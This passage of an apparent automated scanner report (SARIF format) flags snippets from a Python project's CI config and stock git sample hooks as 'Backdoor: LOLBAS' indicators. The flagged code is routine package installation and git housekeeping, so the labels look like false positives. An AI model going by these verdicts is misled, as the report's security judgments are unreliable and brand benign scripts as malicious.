                      "markdown": "`            build-essential \\\n            xz-utils zlib1g bzip2 libbz2-1.0 tar \\\n            sqlite3 libxml2-dev libxslt1-dev \\\n            software-properties-common openssl\n    test_suite: ''\n    test_suite_label: ''\n\n\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/azure-container-deb.yml"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 11,
                  "endLine": 14,
                  "endColumn": 20,
                  "snippet": {
                    "text": "        sudo apt-get -y install \\\n            build-essential \\\n            xz-utils zlib1g bzip2 libbz2-1.0 tar \\\n            sqlite3 libxml2-dev libxslt1-dev \\\n            software-properties-common openssl\n    test_suite: ''\n    test_suite_label: ''\n",
                    "rendered": {
                      "text": "        sudo apt-get -y install \\\n            build-essential \\\n            xz-utils zlib1g bzip2 libbz2-1.0 tar \\\n            sqlite3 libxml2-dev libxslt1-dev \\\n            software-properties-common openssl\n    test_suite: ''\n    test_suite_label: ''\n",
                      "markdown": "`        sudo apt-get -y install \\\n            build-essential \\\n            xz-utils zlib1g bzip2 libbz2-1.0 tar \\\n            sqlite3 libxml2-dev libxslt1-dev \\\n            software-properties-common openssl\n    test_suite: ''\n    test_suite_label: ''\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/azure-container-deb.yml"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 44,
                  "endLine": 13,
                  "endColumn": 49,
                  "snippet": {
                    "text": "        sudo apt-get -y update\n        sudo apt-get -y install \\\n            build-essential \\\n            xz-utils zlib1g bzip2 libbz2-1.0 tar \\\n            sqlite3 libxml2-dev libxslt1-dev \\\n            software-properties-common openssl\n    test_suite: ''\n",
                    "rendered": {
                      "text": "        sudo apt-get -y update\n        sudo apt-get -y install \\\n            build-essential \\\n            xz-utils zlib1g bzip2 libbz2-1.0 tar \\\n            sqlite3 libxml2-dev libxslt1-dev \\\n            software-properties-common openssl\n    test_suite: ''\n",
                      "markdown": "`        sudo apt-get -y update\n        sudo apt-get -y install \\\n            build-essential \\\n            xz-utils zlib1g bzip2 libbz2-1.0 tar \\\n            sqlite3 libxml2-dev libxslt1-dev \\\n            software-properties-common openssl\n    test_suite: ''\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/azure-container-deb.yml"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 12,
                  "endLine": 11,
                  "endColumn": 21,
                  "snippet": {
                    "text": "    install_packages: |\n        set -e -x\n        sudo apt-get -y update\n        sudo apt-get -y install \\\n            build-essential \\\n            xz-utils zlib1g bzip2 libbz2-1.0 tar \\\n            sqlite3 libxml2-dev libxslt1-dev \\\n",
                    "rendered": {
                      "text": "    install_packages: |\n        set -e -x\n        sudo apt-get -y update\n        sudo apt-get -y install \\\n            build-essential \\\n            xz-utils zlib1g bzip2 libbz2-1.0 tar \\\n            sqlite3 libxml2-dev libxslt1-dev \\\n",
                      "markdown": "`    install_packages: |\n        set -e -x\n        sudo apt-get -y update\n        sudo apt-get -y install \\\n            build-essential \\\n            xz-utils zlib1g bzip2 libbz2-1.0 tar \\\n            sqlite3 libxml2-dev libxslt1-dev \\\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/azure-container-deb.yml"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 12,
                  "endLine": 10,
                  "endColumn": 21,
                  "snippet": {
                    "text": "    install_python: ''\n    install_packages: |\n        set -e -x\n        sudo apt-get -y update\n        sudo apt-get -y install \\\n            build-essential \\\n            xz-utils zlib1g bzip2 libbz2-1.0 tar \\\n",
                    "rendered": {
                      "text": "    install_python: ''\n    install_packages: |\n        set -e -x\n        sudo apt-get -y update\n        sudo apt-get -y install \\\n            build-essential \\\n            xz-utils zlib1g bzip2 libbz2-1.0 tar \\\n",
                      "markdown": "`    install_python: ''\n    install_packages: |\n        set -e -x\n        sudo apt-get -y update\n        sudo apt-get -y install \\\n            build-essential \\\n            xz-utils zlib1g bzip2 libbz2-1.0 tar \\\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/ci/azure-container-deb.yml"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 20,
                  "endLine": 7,
                  "snippet": {
                    "text": "    container: ''\n    python_path: ''\n    python_version: ''\n    package_manager: apt-get\n    install_python: ''\n    install_packages: |\n        set -e -x\n        sudo apt-get -y update\n",
                    "rendered": {
                      "text": "    container: ''\n    python_path: ''\n    python_version: ''\n    package_manager: apt-get\n    install_python: ''\n    install_packages: |\n        set -e -x\n        sudo apt-get -y update\n",
                      "markdown": "`    container: ''\n    python_path: ''\n    python_version: ''\n    package_manager: apt-get\n    install_python: ''\n    install_packages: |\n        set -e -x\n        sudo apt-get -y update\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 45,
                  "endLine": 13,
                  "endColumn": 53,
                  "snippet": {
                    "text": "#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n# To enable this hook, rename this file to \"query-watchman\" and set\n",
                    "rendered": {
                      "text": "#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n# To enable this hook, rename this file to \"query-watchman\" and set\n",
                      "markdown": "`#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n# To enable this hook, rename this file to \"query-watchman\" and set\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 51,
                  "endLine": 12,
                  "endColumn": 59,
                  "snippet": {
                    "text": "# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n",
                    "rendered": {
                      "text": "# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n",
                      "markdown": "`# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 53,
                  "endLine": 11,
                  "endColumn": 61,
                  "snippet": {
                    "text": "# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n",
                    "rendered": {
                      "text": "# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n",
                      "markdown": "`# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n# formatted as a string and outputs to stdout a new update token and\n# all files that have been modified since the update token. Paths must\n# be relative to the root of the working tree and separated by a single NUL.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 143,
                  "startColumn": 15,
                  "endLine": 143,
                  "endColumn": 20,
                  "snippet": {
                    "text": "\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n\t\t$error = $output->{error};\n\n",
                    "rendered": {
                      "text": "\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n\t\t$error = $output->{error};\n\n",
                      "markdown": "`\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n\t\t$error = $output->{error};\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 141,
                  "startColumn": 49,
                  "endLine": 141,
                  "endColumn": 54,
                  "snippet": {
                    "text": "\t\t# close $fh;\n\n\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n",
                    "rendered": {
                      "text": "\t\t# close $fh;\n\n\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n",
                      "markdown": "`\t\t# close $fh;\n\n\t\t# Watchman will always return all files on the first query so\n\t\t# return the fast \"everything is dirty\" flag to git and do the\n\t\t# Watchman query just to get it over with now so we won't pay\n\t\t# the cost in git to look up each individual file.\n\t\tmy $o = watchman_clock();\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 129,
                  "startColumn": 30,
                  "endLine": 129,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n\t\t$error = $output->{error};\n",
                    "rendered": {
                      "text": "\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n\t\t$error = $output->{error};\n",
                      "markdown": "`\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n\t\t$error = $output->{error};\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 128,
                  "startColumn": 28,
                  "endLine": 128,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\tmy $error = $output->{error};\n\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n",
                    "rendered": {
                      "text": "\tmy $error = $output->{error};\n\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n",
                      "markdown": "`\tmy $error = $output->{error};\n\tif ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {\n\t\t$retry--;\n\t\tmy $response = qx/watchman watch \"$git_work_tree\"/;\n\t\tdie \"Failed to make watchman watch '$git_work_tree'.\\n\" .\n\t\t    \"Falling back to scanning...\\n\" if $? != 0;\n\t\t$output = $json_pkg->new->utf8->decode($response);\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 30,
                  "endLine": 110,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\tclose CHLD_IN;\n\tmy $response = do {local $/; <CHLD_OUT>};\n\n\t# Uncomment for debugging the watch response\n\t# open ($fh, \">\", \".git/watchman-response.json\");\n\t# print $fh $response;\n\t# close $fh;\n",
                    "rendered": {
                      "text": "\tclose CHLD_IN;\n\tmy $response = do {local $/; <CHLD_OUT>};\n\n\t# Uncomment for debugging the watch response\n\t# open ($fh, \">\", \".git/watchman-response.json\");\n\t# print $fh $response;\n\t# close $fh;\n",
                      "markdown": "`\tclose CHLD_IN;\n\tmy $response = do {local $/; <CHLD_OUT>};\n\n\t# Uncomment for debugging the watch response\n\t# open ($fh, \">\", \".git/watchman-response.json\");\n\t# print $fh $response;\n\t# close $fh;\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 45,
                  "endLine": 8,
                  "endColumn": 50,
                  "snippet": {
                    "text": "use IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n",
                    "rendered": {
                      "text": "use IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n",
                      "markdown": "`use IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n# The hook is passed a version (currently 2) and last update token\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/fsmonitor-watchman.sample"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 17,
                  "endLine": 7,
                  "endColumn": 25,
                  "snippet": {
                    "text": "use warnings;\nuse IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n",
                    "rendered": {
                      "text": "use warnings;\nuse IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n",
                      "markdown": "`use warnings;\nuse IPC::Open2;\n\n# An example hook script to integrate Watchman\n# (https://facebook.github.io/watchman/) with git to speed up detecting\n# new and modified files.\n#\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/post-update.sample"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 4,
                  "endLine": 8,
                  "endColumn": 9,
                  "snippet": {
                    "text": "#\n# To enable this hook, rename this file to \"post-update\".\n\nexec git update-server-info\n",
                    "rendered": {
                      "text": "#\n# To enable this hook, rename this file to \"post-update\".\n\nexec git update-server-info\n",
                      "markdown": "`#\n# To enable this hook, rename this file to \"post-update\".\n\nexec git update-server-info\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/post-update.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to prepare a packed repository for use over\n# dumb transports.\n#\n# To enable this hook, rename this file to \"post-update\".\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to prepare a packed repository for use over\n# dumb transports.\n#\n# To enable this hook, rename this file to \"post-update\".\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to prepare a packed repository for use over\n# dumb transports.\n#\n# To enable this hook, rename this file to \"post-update\".\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 26,
                  "startColumn": 24,
                  "endLine": 26,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n# Cross platform projects tend to avoid non-ASCII filenames; prevent\n# them from being added to the repository. We exploit the fact that the\n# printable range starts at the space character and ends with tilde.\nif [ \"$allownonascii\" != \"true\" ] &&\n\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n",
                    "rendered": {
                      "text": "\n# Cross platform projects tend to avoid non-ASCII filenames; prevent\n# them from being added to the repository. We exploit the fact that the\n# printable range starts at the space character and ends with tilde.\nif [ \"$allownonascii\" != \"true\" ] &&\n\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n",
                      "markdown": "`\n# Cross platform projects tend to avoid non-ASCII filenames; prevent\n# them from being added to the repository. We exploit the fact that the\n# printable range starts at the space character and ends with tilde.\nif [ \"$allownonascii\" != \"true\" ] &&\n\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 49,
                  "startColumn": 4,
                  "endLine": 49,
                  "endColumn": 9,
                  "snippet": {
                    "text": "fi\n\n# If there are whitespace errors, print the offending file names and fail.\nexec git diff-index --check --cached $against --\n",
                    "rendered": {
                      "text": "fi\n\n# If there are whitespace errors, print the offending file names and fail.\nexec git diff-index --check --cached $against --\n",
                      "markdown": "`fi\n\n# If there are whitespace errors, print the offending file names and fail.\nexec git diff-index --check --cached $against --\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 1,
                  "endLine": 43,
                  "endColumn": 6,
                  "snippet": {
                    "text": "\nIf you know what you are doing you can disable this check using:\n\n  git config hooks.allownonascii true\nEOF\n\texit 1\nfi\n",
                    "rendered": {
                      "text": "\nIf you know what you are doing you can disable this check using:\n\n  git config hooks.allownonascii true\nEOF\n\texit 1\nfi\n",
                      "markdown": "`\nIf you know what you are doing you can disable this check using:\n\n  git config hooks.allownonascii true\nEOF\n\texit 1\nfi\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 34,
                  "endLine": 34,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\nError: Attempt to add a non-ASCII file name.\n\nThis can cause problems if you want to work with people on other platforms.\n",
                    "rendered": {
                      "text": "\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\nError: Attempt to add a non-ASCII file name.\n\nThis can cause problems if you want to work with people on other platforms.\n",
                      "markdown": "`\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\nError: Attempt to add a non-ASCII file name.\n\nThis can cause problems if you want to work with people on other platforms.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 11,
                  "endLine": 31,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n\t# the square bracket bytes happen to fall in the designated range.\n\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\n",
                    "rendered": {
                      "text": "\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n\t# the square bracket bytes happen to fall in the designated range.\n\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\n",
                      "markdown": "`\t# Note that the use of brackets around a tr range is ok here, (it's\n\t# even required, for portability to Solaris 10's /usr/bin/tr), since\n\t# the square bracket bytes happen to fall in the designated range.\n\ttest $(git diff --cached --name-only --diff-filter=A -z $against |\n\t  LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n\tcat <<\\EOF\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
